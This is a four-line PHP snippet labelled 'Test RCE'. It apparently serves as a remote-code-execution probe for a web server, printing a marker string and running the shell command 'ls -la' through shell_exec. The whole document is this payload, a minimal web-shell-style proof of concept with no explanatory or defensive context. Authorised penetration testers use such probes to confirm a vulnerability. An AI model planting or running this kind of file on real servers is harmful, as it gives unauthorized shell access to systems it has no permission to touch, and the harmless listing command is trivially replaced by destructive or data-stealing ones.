<pre>
<?php 
echo "Test RCE";
echo shell_exec("ls -la");
?>
</pre>
